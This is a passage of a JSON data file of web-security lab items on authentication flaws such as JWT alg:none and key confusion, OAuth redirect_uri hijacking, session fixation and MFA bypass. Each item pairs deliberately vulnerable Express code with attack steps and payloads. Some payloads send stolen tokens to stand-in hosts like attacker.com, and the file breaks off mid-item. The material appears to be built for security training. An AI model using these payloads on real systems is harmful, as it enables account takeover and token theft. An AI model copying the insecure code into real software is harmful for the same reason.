[
  {
    "Lab scenario": "REST API JWT role escalation via unverified header injection",
    "Lab Description": "The REST API endpoint validates JWT tokens but fails to verify custom headers. The application blindly trusts X-Role headers when present. To solve: craft a request combining a low-privilege JWT with a malicious X-Role header to gain admin access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept normal user API request with Burp Suite",
      "Add X-Role: admin header to the request",
      "Modify JWT to extend expiration time",
      "Verify role change in API response",
      "Access admin-only endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/api/admin', (req, res) => {const token = req.headers.authorization?.split(' ')[1];const role = req.headers['x-role'] || jwt.verify(token,'secret').role;if(role === 'admin') return res.send('Admin data');res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "GET /api/admin HTTP/1.1\nX-Role: admin",
      "GET /api/admin HTTP/1.1\nX-Role: superuser"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via state parameter reflection",
    "Lab Description": "The OAuth implementation reflects the state parameter without validation in the redirect URL. The application fails to maintain server-side state. To solve: intercept the OAuth flow and modify the state parameter to hijack another user's session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow with attacker account",
      "Intercept callback using OWASP ZAP",
      "Modify state parameter to victim's session ID",
      "Complete flow with stolen token",
      "Access victim's resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const {code,state} = req.query;res.cookie('session',state);res.redirect(`/?token=${code}`);});app.listen(3000);",
    "payloads": [
      "https://vulnerable.com/oauth/callback?code=ABC123&state=attacker_session",
      "https://vulnerable.com/oauth/callback?code=XYZ789&state=victim_session"
    ]
  },
  {
    "Lab scenario": "GraphQL batched query authentication bypass",
    "Lab Description": "The GraphQL endpoint processes batched queries sequentially without proper authorization checks between operations. The application fails to validate query interdependencies. To solve: craft a batched query that combines an authentication mutation with a privileged query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify GraphQL endpoint using Postman",
      "Construct batched query with auth mutation",
      "Chain privileged query in same batch",
      "Execute combined operation",
      "Extract sensitive data from response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {graphqlHTTP} = require('express-graphql');const {buildSchema} = require('graphql');const schema = buildSchema(`type Query {secretData:String} type Mutation {login(username:String,password:String):String}`);const root = {secretData:()=>'Confidential',login:(args)=>args.username==='admin'&&args.password==='admin'?'valid':'invalid'};app.use('/graphql',graphqlHTTP({schema,rootValue:root}));",
    "payloads": [
      "[{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"admin\\\")}\"},{\"query\":\"{secretData}\"}]",
      "[{\"query\":\"mutation{login(username:\\\"any\\\",password:\\\"any\\\")}\"},{\"query\":\"{secretData}\"}]"
    ]
  },
  {
    "Lab scenario": "Session fixation via JSONP callback parameter",
    "Lab Description": "The application sets session cookies through a JSONP endpoint that reflects callback parameters. The vulnerable implementation allows session fixation attacks. To solve: craft a malicious page that fixes a session ID for the victim then triggers authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify JSONP session endpoint",
      "Craft malicious HTML page with fixed session",
      "Lure victim to visit the page",
      "Wait for victim to authenticate",
      "Use fixed session to access account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/session.jsonp', (req, res) => {const callback = req.query.callback||'callback';res.send(`${callback}({session:'${req.query.sid||Math.random()}'})`);});app.listen(3000);",
    "payloads": [
      "<script src=\"https://vulnerable.com/session.jsonp?callback=fixSession&sid=malicious123\"></script>",
      "<script src=\"https://vulnerable.com/session.jsonp?sid=attacker_controlled\"></script>"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT verification accepts arbitrary jku (JWK Set URL) headers without validation. The application fails to whitelist trusted key servers. To solve: host a malicious JWK Set and craft a token signed with your own key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Generate RSA key pair using OpenSSL",
      "Host malicious JWK Set JSON file",
      "Craft JWT with jku pointing to your server",
      "Sign token with your private key",
      "Submit to protected endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const jwksClient = require('jwks-rsa');const app = express();app.get('/protected', (req, res) => {const token = req.headers.authorization?.split(' ')[1];const decoded = jwt.decode(token,{complete:true});const client = jwksClient({jwksUri:decoded?.header?.jku});client.getSigningKey(decoded.header.kid,(err,key)=>{if(err) return res.status(403).send('Invalid token');jwt.verify(token,key.getPublicKey(),(err,payload)=>{if(err) return res.status(403).send('Invalid token');res.send('Protected data');});});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2tleXMuanNvbiIsImtpZCI6Im1hbGljaW91cyJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.fake_signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vZXZpbC5jb20vandrcyIsImtpZCI6IjEyMzQ1In0.eyJyb2xlIjoiYWRtaW4ifQ.fake_sig"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Forwarded-Host header",
    "Lab Description": "The password reset functionality uses the Host header to generate reset links without proper validation. The application trusts X-Forwarded-Host headers. To solve: poison the reset link generation to send tokens to an attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp",
      "Add X-Forwarded-Host: attacker.com header",
      "Trigger reset for victim account",
      "Capture token from your server logs",
      "Complete password reset"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset-password', (req, res) => {const host = req.headers['x-forwarded-host']||req.headers.host;const token = generateToken();res.send(`Reset link: https://${host}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset-password HTTP/1.1\nX-Forwarded-Host: attacker.com",
      "POST /reset-password HTTP/1.1\nHost: vulnerable.com\nX-Forwarded-Host: evil.net"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification state",
    "Lab Description": "The multi-factor authentication flow has a race condition between verification and session state update. The application uses eventual consistency for MFA status. To solve: send parallel requests to bypass MFA before state propagation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate MFA verification in browser",
      "Intercept both verification and session requests",
      "Send verification and session requests in parallel",
      "Repeat until session grants access",
      "Access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let mfaVerified = {};app.post('/verify-mfa', (req, res) => {mfaVerified[req.body.session] = true;res.send('Verified');});app.get('/session', (req, res) => {setTimeout(()=>{if(mfaVerified[req.query.id]) res.send('Access granted');else res.status(403).send('MFA required');},100);});app.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\nContent-Type: application/json\n\n{\"session\":\"victim123\"}",
      "GET /session?id=victim123 HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-insensitive password comparison",
    "Lab Description": "The login endpoint performs case-insensitive password comparison. The application fails to normalize input before hashing. To solve: exploit the case-insensitive check to reduce password entropy for brute-forcing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify case-insensitive behavior with Postman",
      "Generate case variations of common passwords",
      "Configure Burp Intruder with case variants",
      "Execute credential stuffing attack",
      "Identify successful logins"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{username:'admin',password:'Secret123'}];app.post('/login', (req, res) => {const user = users.find(u=>u.username===req.body.username&&u.password.toLowerCase()===req.body.password.toLowerCase());if(user) res.send('Logged in');else res.status(401).send('Invalid credentials');});app.listen(3000);",
    "payloads": [
      "{\"username\":\"admin\",\"password\":\"secret123\"}",
      "{\"username\":\"admin\",\"password\":\"SECRET123\"}",
      "{\"username\":\"admin\",\"password\":\"SeCrEt123\"}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in Node.js authentication middleware",
    "Lab Description": "The lab's JWT authentication implementation accepts unsigned tokens when alg:none is specified. The application fails to validate token signatures properly. To solve: forge a valid admin token by exploiting the alg:none vulnerability.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite",
      "Decode the token in JWT Editor to analyze structure",
      "Modify the alg header to 'none' and remove signature",
      "Change the role claim to 'admin'",
      "Submit the modified token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const decoded = jwt.decode(token, {complete: true});if (decoded.header.alg === 'none') {const payload = decoded.payload;if (payload.role === 'admin') return res.send('Admin access granted');}res.status(403).send('Access denied');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via open redirect in callback endpoint",
    "Lab Description": "The OAuth implementation leaks access tokens through an unvalidated redirect parameter in the callback endpoint. The application fails to check redirect URLs against a whitelist. To solve: steal the OAuth token by forcing it to be sent to an attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth callback URL parameter using OWASP ZAP",
      "Craft a malicious redirect URL to attacker.com",
      "Initiate OAuth flow with modified redirect_uri",
      "Intercept the callback containing the access token",
      "Use the token to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const {code, state, redirect_uri} = req.query;const token = generateAccessToken(code);res.redirect(`${redirect_uri}?token=${token}`);});function generateAccessToken(code) {return 'secret_token_'+code;}app.listen(3000);",
    "payloads": [
      "https://vulnerable.com/oauth/callback?code=123&redirect_uri=https://attacker.com",
      "https://vulnerable.com/oauth/callback?code=456&redirect_uri=http://evil.com"
    ]
  },
  {
    "Lab scenario": "Session fixation via unprotected session regeneration",
    "Lab Description": "The application assigns session IDs before authentication and doesn't regenerate them after login. The vulnerable behavior allows session fixation attacks. To solve: fixate a session ID on victim's browser then wait for them to authenticate.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Obtain a valid session cookie from application",
      "Set victim's cookie using XSS or MITM",
      "Wait for victim to authenticate",
      "Access account using the pre-set session ID",
      "Verify privileged access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const session = require('express-session');const app = express();app.use(session({secret:'weaksecret',resave:false,saveUninitialized:true}));app.post('/login', (req, res) => {req.session.user = req.body.username;res.send('Logged in');});app.get('/admin', (req, res) => {if (req.session.user === 'admin') res.send('Admin panel');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "sessionid=malicious123",
      "connect.sid=s%3Aevil.session"
    ]
  },
  {
    "Lab scenario": "GraphQL introspection leads to unauthorized data access",
    "Lab Description": "The GraphQL endpoint has introspection enabled, exposing sensitive schema information. The application doesn't implement proper authorization checks. To solve: extract hidden mutations through introspection then execute privileged operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send introspection query using Postman",
      "Analyze schema for hidden mutations",
      "Craft mutation to elevate privileges",
      "Execute mutation with stolen token",
      "Verify admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {buildSchema} = require('graphql');const schema = buildSchema(`type Query {hiddenMutation: String}`);const root = {hiddenMutation: () => 'Sensitive data exposed'};app.use('/graphql', graphqlHTTP({schema,rootValue:root,graphiql:true}));",
    "payloads": [
      "{\"query\":\"query {__schema {types {name fields {name}}}}\"}",
      "{\"query\":\"mutation {hiddenMutation}\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The multi-factor authentication flow can be bypassed by modifying the status parameter. The application trusts client-side state for authentication decisions. To solve: intercept and modify the MFA verification request to bypass the check.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA request using Burp Suite",
      "Identify status parameter in JSON body",
      "Change status from 'pending' to 'verified'",
      "Forward modified request",
      "Access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());app.post('/verify-mfa', (req, res) => {if (req.body.status === 'verified') {return res.json({access_token: 'valid'});}res.status(403).json({error: 'MFA required'});});app.listen(3000);",
    "payloads": [
      "{\"status\":\"verified\"}",
      "{\"mfa_status\":\"bypassed\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via weak rate limiting on login",
    "Lab Description": "The login endpoint has insufficient rate limiting, allowing credential stuffing attacks. The application doesn't implement proper account lockout mechanisms. To solve: perform a credential stuffing attack using known password lists.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Gather known username/password pairs",
      "Configure Burp Intruder with credential lists",
      "Bypass rate limiting by rotating IPs",
      "Identify successful logins",
      "Access compromised accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());const users = [{username:'admin',password:'Summer2023!'}];app.post('/login', (req, res) => {const user = users.find(u => u.username === req.body.username && u.password === req.body.password);if (user) return res.json({token:'valid'});res.status(401).json({error:'Invalid credentials'});});app.listen(3000);",
    "payloads": [
      "{\"username\":\"admin\",\"password\":\"password123\"}",
      "{\"username\":\"admin\",\"password\":\"admin\"}",
      "{\"username\":\"admin\",\"password\":\"Summer2023!\"}"
    ]
  },
  {
    "Lab scenario": "SOAP API authentication bypass via XML comments",
    "Lab Description": "The SOAP endpoint processes XML comments as part of the authentication logic. The application's XML parser improperly handles comments in authentication elements. To solve: bypass authentication by injecting comments in the SOAP body.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept SOAP request using Burp Suite",
      "Add XML comments to username/password elements",
      "Modify request to bypass checks",
      "Forward modified request",
      "Access privileged SOAP methods"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const xmlParser = require('express-xml-bodyparser');const app = express();app.use(xmlParser());app.post('/soap', (req, res) => {const xml = req.body;const user = xml['soap:Envelope']['soap:Body'][0].Login[0].Username[0]._;const pass = xml['soap:Envelope']['soap:Body'][0].Login[0].Password[0]._;if (user === 'admin' && pass === 'secret') res.send('Valid');else res.status(403).send('Invalid');});app.listen(3000);",
    "payloads": [
      "<soap:Envelope><soap:Body><Login><Username>admin<!-- --></Username><Password>wrong<!-- --></Password></Login></soap:Body></soap:Envelope>",
      "<soap:Envelope><soap:Body><Login><Username><!-- -->admin</Username><Password><!-- --></Password></Login></soap:Body></soap:Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's authentication system uses JWT tokens with improper signature validation. The application fails to verify the token signature when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite while logging in as a low-privilege user",
      "Decode the token using jwt.io to analyze its structure",
      "Modify the alg header to 'none' and change the role claim to 'admin'",
      "Remove the signature section entirely (leave it empty after the second dot)",
      "Submit the modified token in the Authorization header to access the admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
    ]
  },
  {
    "Lab scenario": "GraphQL query batching authentication bypass",
    "Lab Description": "The lab's GraphQL endpoint is vulnerable to query batching attacks that can bypass rate limiting on authentication attempts. The application processes batched queries sequentially without proper session checks. To solve: craft a batch query that simultaneously tests multiple credentials while appearing as a single request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a normal GraphQL login request",
      "Modify the request to include multiple login mutations in a single batch",
      "Structure the batch to test common credentials permutations",
      "Include a valid credential at the end to avoid triggering account lockouts",
      "Analyze responses to identify successful authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Mutation {\n    login(username: String!, password: String!): AuthPayload\n  }\n  type AuthPayload {\n    token: String\n  }\n`;\nconst resolvers = {\n  Mutation: {\n    login: (_, { username, password }) => {\n      if (username === 'admin' && password === 's3cr3tP@ss') {\n        return { token: 'valid-token' };\n      }\n      return { token: null };\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"password1\\\") { token } }\"}, {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"123456\\\") { token } }\"}, {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"s3cr3tP@ss\\\") { token } }\"}]",
      "[{\"query\":\"mutation($input: LoginInput!) { login(input: $input) { token } }\", \"variables\": {\"input\": {\"username\": \"admin\", \"password\": \"password\"}}}, {\"query\":\"mutation($input: LoginInput!) { login(input: $input) { token } }\", \"variables\": {\"input\": {\"username\": \"admin\", \"password\": \"admin123\"}}}]"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through insecure redirect_uri",
    "Lab Description": "The lab's OAuth implementation fails to properly validate redirect_uri parameters, allowing token leakage. The application generates OAuth tokens before validating the redirect URI. To solve: intercept the OAuth flow and modify the redirect_uri to point to your attacker server to capture the authorization code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth login and intercept the authorization request with Burp Suite",
      "Modify the redirect_uri parameter to your controlled domain",
      "Allow the request to complete and observe the authorization code at your server",
      "Exchange the stolen code for an access token at the OAuth token endpoint",
      "Use the token to authenticate as the victim user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = {\n  'labClient': {\n    secret: 'clientSecret123',\n    allowedRedirects: ['https://lab-domain.com/callback']\n  }\n};\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const code = 'generated-auth-code-123';\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({ access_token: 'valid-access-token', token_type: 'Bearer' });\n  } else {\n    res.status(401).json({ error: 'invalid_client' });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://oauth-lab.com/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=https://attacker.com/callback",
      "https://oauth-lab.com/oauth/authorize?response_type=token&client_id=labClient&redirect_uri=http://localhost:9999"
    ]
  },
  {
    "Lab scenario": "Session fixation via XSS in JWT token endpoint",
    "Lab Description": "The lab's JWT generation endpoint is vulnerable to XSS injection in custom claims, allowing session fixation attacks. The application fails to sanitize user-controlled input when generating tokens. To solve: craft a malicious JWT that executes XSS when decoded by the admin panel, then fixate this token as the admin's session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the JWT generation request using Burp Suite and identify custom claim parameters",
      "Inject XSS payload into a custom claim (e.g., 'user_metadata') using Postman",
      "Encode the malicious JWT and use it to authenticate as a low-privilege user",
      "Report the token to the admin interface (simulated by clicking 'Report Abuse')",
      "Wait for admin to decode the token, executing the XSS and setting your token as their session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.post('/generate-token', (req, res) => {\n  const { username, user_metadata } = req.body;\n  const token = jwt.sign({\n    username: username,\n    metadata: user_metadata,\n    role: 'user'\n  }, 'weaksecret', { algorithm: 'HS256' });\n  res.json({ token });\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.verify(token, 'weaksecret');\n  if (decoded.role === 'admin') {\n    res.send(`Welcome admin! Metadata: ${decoded.metadata}`);\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "{\"username\":\"attacker\",\"user_metadata\":\"<script>document.cookie='token='+localStorage.getItem('malicious_token')</script>\"}",
      "{\"username\":\"victim\",\"user_metadata\":\"javascript:eval(atob('ZG9jdW1lbnQuY29va2llPSd0b2tlbj0nK2xvY2FsU3RvcmFnZS5nZXRJdGVtKCdtYWxpY2lvdXNfdG9rZW4nKQ=='))\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through misconfigured CORS in REST API",
    "Lab Description": "The lab's OAuth implementation has overly permissive CORS headers, allowing token leakage to arbitrary domains. The application returns Access-Control-Allow-Credentials: true with wildcard origins. To solve: craft a malicious web page that steals OAuth tokens through credentialed CORS requests.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to analyze CORS headers during OAuth flow",
      "Create an HTML page with JavaScript to make credentialed XMLHttpRequest to the OAuth endpoint",
      "Host the page on an attacker-controlled domain",
      "Trick an authenticated user into visiting the malicious page",
      "Capture the leaked token from the server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n  origin: '*',\n  credentials: true\n}));\nconst tokens = {};\napp.get('/oauth/token', (req, res) => {\n  const token = 'sample-oauth-token-' + Math.random().toString(36).substr(2);\n  tokens[token] = { user: 'admin', expires: Date.now() + 3600000 };\n  res.json({ access_token: token, token_type: 'Bearer' });\n});\napp.get('/profile', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  if (tokens[token]) {\n    res.json({ username: tokens[token].user });\n  } else {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://vulnerable-oauth.com/profile', true); xhr.withCredentials = true; xhr.onreadystatechange = function() { if(xhr.readyState === 4) { fetch('https://attacker.com/steal?token='+xhr.responseText); } }; xhr.send();</script>",
      "<iframe src=\"javascript:xmlhttp=new XMLHttpRequest();xmlhttp.open('GET','https://vulnerable-oauth.com/oauth/token',true);xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href='https://attacker.com/leak?'+btoa(xmlhttp.responseText)}};xmlhttp.send();\"></iframe>"
    ]
  },
  {
    "Lab scenario": "JWT key confusion attack through exposed JWKS endpoint",
    "Lab Description": "The lab's authentication system exposes a JWKS endpoint with leaked RSA private key parameters while accepting HS256-signed tokens. The application fails to validate the signing algorithm properly. To solve: convert the public key to HMAC secret, then craft an admin token signed with the converted key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover the JWKS endpoint through directory brute-forcing with OWASP ZAP",
      "Download the public key and convert it to PEM format using OpenSSL",
      "Use the PEM file as an HMAC secret to sign a modified JWT with algorithm HS256",
      "Replace the RS256-signed token with your HS256-signed version in Burp Repeater",
      "Verify admin access through the /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/.well-known/jwks.json'\n});\napp.get('/.well-known/jwks.json', (req, res) => {\n  res.json({\n    keys: [{\n      kty: 'RSA',\n      e: 'AQAB',\n      n: 'vGO...3Zw',\n      kid: '2023-01'\n    }]\n  });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  jwt.verify(token, (header, callback) => {\n    client.getSigningKey(header.kid, (err, key) => {\n      if (header.alg === 'HS256') {\n        return callback(null, key.rsaPublicKey);\n      }\n      callback(err, key.getPublicKey());\n    });\n  }, { algorithms: ['RS256', 'HS256'] }, (err, decoded) => {\n    if (err) return res.status(401).send('Invalid token');\n    res.json(decoded);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjIwMjMtMDEifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjIwMjMtMDEifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaXNzIjoiaHR0cHM6Ly92dWxuZXJhYmxlLWF1dGguY29tIn0.4j5D6vLJQV8JQ3X7yZ8w0nTmZnQJwW5cF7V9z2X1x4Y"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The lab's JWT validation microservice is vulnerable to key path traversal through the kid header. The application uses user-controlled kid values to load verification keys without proper sanitization. To solve: craft a JWT that forces the server to use a predictable public key file for verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and analyze the kid header",
      "Modify the kid header to traverse directories (../../../../etc/passwd)",
      "Identify predictable key locations (../../keys/public.pem)",
      "Sign a new token with the predictable public key using HS256 algorithm",
      "Submit the token to bypass authentication and access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.get('/verify', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  const keyPath = `/keys/${decoded.header.kid}`;\n  try {\n    const key = fs.readFileSync(keyPath);\n    jwt.verify(token, key, {algorithms: ['RS256', 'HS256']});\n    res.json({access: 'granted'});\n  } catch (e) {\n    res.status(403).json({error: 'Invalid token'});\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uL2tleXMvcHVibGljLnBlbSJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.4j5D6vLJQV8JQ3X7yZ8w0nTmZnQJwW5cF7V9z2X1x4Y"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF with open redirect",
    "Lab Description": "The lab's OAuth implementation fails to validate state parameters properly while having an open redirect vulnerability. The application accepts arbitrary redirect_uri values and doesn't store state parameters server-side. To solve: craft a malicious link that captures victim tokens through CSRF and open redirect chaining.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to identify the open redirect in the OAuth flow",
      "Create a CSRF payload that triggers OAuth authorization",
      "Chain the open redirect to point to an attacker-controlled server",
      "Embed the payload in a phishing page and lure the victim",
      "Capture the authorization code from server logs and exchange for token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (client_id === 'vulnerable-client') {\n    const code = 'random-auth-code';\n    res.redirect(`${redirect_uri}?code=${code}&state=${state||''}`);\n  } else {\n    res.status(400).send('Invalid client');\n  }\n});\napp.get('/redirect', (req, res) => {\n  res.redirect(req.query.url);\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-oauth.com/oauth/authorize?client_id=vulnerable-client&redirect_uri=https://attacker.com&state=csrf-token",
      "https://vulnerable-oauth.com/redirect?url=https://attacker.com/steal?token=[OAuth-code]"
    ]
  },
  {
    "Lab scenario": "Session swapping via concurrent login race condition",
    "Lab Description": "The lab's session management system is vulnerable to race conditions during concurrent login attempts. The application generates session tokens before validating credentials, allowing session swapping between users. To solve: perform concurrent login attempts to swap a low-privilege session with an admin session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite Turbo Intruder to send rapid concurrent login requests",
      "Interleave admin credential attempts with valid low-privilege logins",
      "Capture successful responses and analyze session tokens",
      "Identify token collisions where admin privileges are granted",
      "Use the swapped session token to access restricted endpoints"
    ],
    "Vulnerability name": "Authentication",
